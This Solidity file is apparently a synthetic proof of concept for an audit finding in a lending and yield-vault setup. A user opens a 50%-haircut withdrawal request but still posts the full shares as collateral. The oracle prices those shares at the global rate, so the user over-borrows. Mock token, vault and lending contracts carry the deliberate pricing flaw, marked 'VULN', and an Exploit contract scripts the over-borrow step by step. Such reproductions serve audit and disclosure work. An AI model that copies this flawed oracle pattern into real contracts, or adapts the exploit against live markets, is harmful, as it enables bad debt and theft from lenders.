// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Notional Exponent — Direct Morpho borrow prices collateral without the
    withdrawal-request value (Sherlock 2025-06, #62485, H-4)

    SYNTHETIC, cheatcode-free reduction.

    Root cause: when t_currentAccount is set (LendingRouter), convertToAssets
    prices a holder's shares from their withdrawal-request value. Morpho.borrow
    never sets that transient, so price() falls back to global yield-token
    holdings. A user with an active request is priced as if still yield-backed.

    Setup: honest depositor keeps yield in the vault (global rate ~1:1). Attacker
    initiates a haircut withdrawal request (50%) but still posts shares as Morpho
    collateral. Morpho overprices vs the request -> attacker over-borrows.
//////////////////////////////////////////////////////////////////////////*/

contract MockERC20 {
    string public name;
    string public symbol;
    uint8 public decimals;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    uint256 public totalSupply;

    constructor(string memory n, string memory s, uint8 d) {
        name = n;
        symbol = s;
        decimals = d;
    }

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
        totalSupply += amt;
    }

    function approve(address spender, uint256 amt) external returns (bool) {
        allowance[msg.sender][spender] = amt;
        return true;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        if (msg.sender != from) {
            uint256 a = allowance[from][msg.sender];
            if (a != type(uint256).max) allowance[from][msg.sender] = a - amt;
        }
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

contract YieldStrategy {
    uint256 public constant VIRTUAL_SHARES = 1e6;
    uint256 public constant VIRTUAL_YIELD = 1e6;

    MockERC20 public immutable yieldToken;

    mapping(address => uint256) public balanceOf;
    uint256 public totalSupply;
    uint256 public s_escrowedShares;

    mapping(address => uint256) public withdrawRequestAssets;
    mapping(address => uint256) public withdrawRequestShares;
    address public t_currentAccount;

    constructor(MockERC20 _y) {
        yieldToken = _y;
    }

    function setCurrentAccount(address a) external {
        t_currentAccount = a;
    }

    function clearCurrentAccount() external {
        t_currentAccount = address(0);
    }

    function effectiveSupply() public view returns (uint256) {
        uint256 s = totalSupply - s_escrowedShares;
        return s < VIRTUAL_SHARES ? VIRTUAL_SHARES : s;
    }

    function convertSharesToYieldToken(uint256 shares) public view returns (uint256) {
        uint256 yBal = yieldToken.balanceOf(address(this));
        return (shares * (yBal + VIRTUAL_YIELD)) / effectiveSupply();
    }

    function convertToAssets(uint256 shares) public view returns (uint256) {
        return convertSharesToYieldToken(shares);
    }

    /// @notice Router path: when t_currentAccount matches, use request value.
    function priceFor(address account) public view returns (uint256) {
        if (t_currentAccount == account && withdrawRequestShares[account] > 0) {
            return (withdrawRequestAssets[account] * 1e36) / withdrawRequestShares[account];
        }
        return convertToAssets(1e18) * 1e18;
    }

    /// @notice Morpho oracle - no account context.
    function price() public view returns (uint256) {
        // No account / no request path; prices from global yield holdings.
        // FIX: if account has a withdraw request, price at request assets.
        return convertToAssets(1e18) * 1e18; // @> VULN: ignores withdrawal-request value
    }

    function deposit(uint256 yieldAmt) external returns (uint256 shares) {
        yieldToken.transferFrom(msg.sender, address(this), yieldAmt);
        shares = yieldAmt;
        balanceOf[msg.sender] += shares;
        totalSupply += shares;
    }

    function initiateWithdraw(uint256 shares) external {
        require(balanceOf[msg.sender] >= shares, "bal");
        // Snapshot fair value BEFORE escrow so request is a real haircut on live rate
        uint256 live = convertToAssets(shares);
        balanceOf[msg.sender] -= shares;
        s_escrowedShares += shares;
        withdrawRequestShares[msg.sender] = shares;
        withdrawRequestAssets[msg.sender] = live / 2; // 50% haircut request value
        // Yield remains in vault (honest LP capital keeps global rate healthy)
    }
}

contract MockMorpho {
    MockERC20 public immutable loan;
    YieldStrategy public immutable oracle;
    mapping(address => uint256) public collateral;
    mapping(address => uint256) public debt;
    uint256 public liquidity;

    constructor(MockERC20 _loan, YieldStrategy _o) {
        loan = _loan;
        oracle = _o;
    }

    function fund(uint256 amt) external {
        loan.transferFrom(msg.sender, address(this), amt);
        liquidity += amt;
    }

    function supplyCollateral(address who, uint256 shares) external {
        collateral[who] += shares;
    }

    function borrow(uint256 assets, address onBehalf, address to) external {
        uint256 maxB = (collateral[onBehalf] * oracle.price()) / 1e36;
        require(debt[onBehalf] + assets <= maxB, "LTV");
        require(liquidity >= assets, "liq");
        debt[onBehalf] += assets;
        liquidity -= assets;
        loan.transfer(to, assets);
    }
}

contract HonestLP {
    function deposit(YieldStrategy y, MockERC20 yt, uint256 amt) external {
        yt.approve(address(y), amt);
        y.deposit(amt);
    }
}

contract Exploit {
    MockERC20 public yieldTok; // 1
    MockERC20 public usdc; // 2
    YieldStrategy public y; // 3 vulnerable
    MockMorpho public morpho; // 4
    HonestLP public honest; // 5

    uint256 public constant HONEST = 900e18;
    uint256 public constant ATTACKER = 100e18;
    uint256 public constant MARKET = 200e18;

    constructor() {
        yieldTok = new MockERC20("yt", "YT", 18);
        usdc = new MockERC20("usdc", "USDC", 18);
        y = new YieldStrategy(yieldTok);
        morpho = new MockMorpho(usdc, y);
        honest = new HonestLP();

        // Honest LP keeps yield in vault (global rate anchor)
        yieldTok.mint(address(honest), HONEST);
        honest.deposit(y, yieldTok, HONEST);

        // Attacker funds
        yieldTok.mint(address(this), ATTACKER);
        usdc.mint(address(this), MARKET);
        usdc.approve(address(morpho), MARKET);
        morpho.fund(MARKET);
    }

    function run() external {
        yieldTok.approve(address(y), ATTACKER);
        uint256 shares = y.deposit(ATTACKER);
        morpho.supplyCollateral(address(this), shares);

        // Router-correct path: set transient, initiate withdraw, read request price
        y.setCurrentAccount(address(this));
        y.initiateWithdraw(shares);
        uint256 correctPrice = y.priceFor(address(this));
        y.clearCurrentAccount();

        uint256 morphoPrice = y.price(); // @> VULN path: global rate, ignores request

        // Global rate still ~1 (honest capital). Request is half. Morpho overprices.
        require(morphoPrice > correctPrice, "Morpho overprices vs request");

        uint256 maxMorpho = (shares * morphoPrice) / 1e36;
        uint256 maxCorrect = (shares * correctPrice) / 1e36;
        require(maxMorpho > maxCorrect, "inflated maxBorrow");

        // Borrow above request-backed LTV (fails under correct oracle)
        uint256 borrowAmt = maxCorrect + 1;
        if (borrowAmt > maxMorpho) borrowAmt = maxMorpho;
        if (borrowAmt > morpho.liquidity()) borrowAmt = morpho.liquidity();
        require(borrowAmt > maxCorrect, "need capacity above request LTV");

        morpho.borrow(borrowAmt, address(this), address(this));

        // HARM: loan tokens taken against overpriced withdraw-request collateral
        require(usdc.balanceOf(address(this)) == borrowAmt, "borrowed");
        require(borrowAmt > maxCorrect, "bad debt vs request value");
        require(y.withdrawRequestAssets(address(this)) > 0, "request active");
        require(y.withdrawRequestAssets(address(this)) < shares, "request is haircut vs shares");
    }
}
